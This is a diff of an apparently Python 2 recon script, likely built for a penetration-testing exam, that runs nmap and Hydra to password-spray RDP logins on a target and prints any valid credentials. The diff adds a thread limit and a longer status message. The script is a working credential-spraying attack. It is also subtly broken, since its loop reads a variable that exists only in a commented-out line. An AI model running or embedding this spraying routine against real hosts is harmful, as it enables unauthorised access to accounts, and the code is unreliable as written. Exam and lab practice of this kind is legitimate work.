@@ -22,12 +22,12 @@ subprocess.check_output(['nmap','-n','-sV','-Pn','-vv','-p',port,'--script=rdp-e
 #Default Hydra configuration with a small username and password list
 #This configuration is meant to spray, not to brute. Manually configure a
 #Brute scan if desired.
-print "INFO: Performing hydra rdp scan against %s" % (ip_address)
+print "INFO: Performing hydra rdp scan against %s. This will take a LONG time" % (ip_address)
 #HYDRA = "hydra -L /usr/share/wordlists/lists/userlist.txt -P /usr/share/wordlists/lists/quick_password_spray.txt -f -o /root/scripts/recon_enum/results/exam/rdp/%s_rdphydra.txt -u %s -s %s rdp" % (ip_address, ip_address, port)
 try:
     #results = subprocess.check_output(HYDRA, shell=True)
     #resultarr = results.split("\n")
-    results = subprocess.check_output(['hydra','-L','/root/lists/userlist.txt','-P','/root/lists/quick_password_spray.txt','-f','-o','/root/scripts/recon_enum/results/exam/rdp/%s_%s_rdphydra.txt' % (ip_address,port),'-u',ip_address,'-s',port,'rdp']).split("\n")
+    results = subprocess.check_output(['hydra','-L','/root/lists/userlist.txt','-P','/root/lists/quick_password_spray.txt','-f','-o','/root/scripts/recon_enum/results/exam/rdp/%s_%s_rdphydra.txt' % (ip_address,port),'-t','4','-u',ip_address,'-s',port,'rdp']).split("\n")
     for result in resultarr:
         if "login:" in result:
             print "[*] Valid rdp credentials found: %s" % (result)
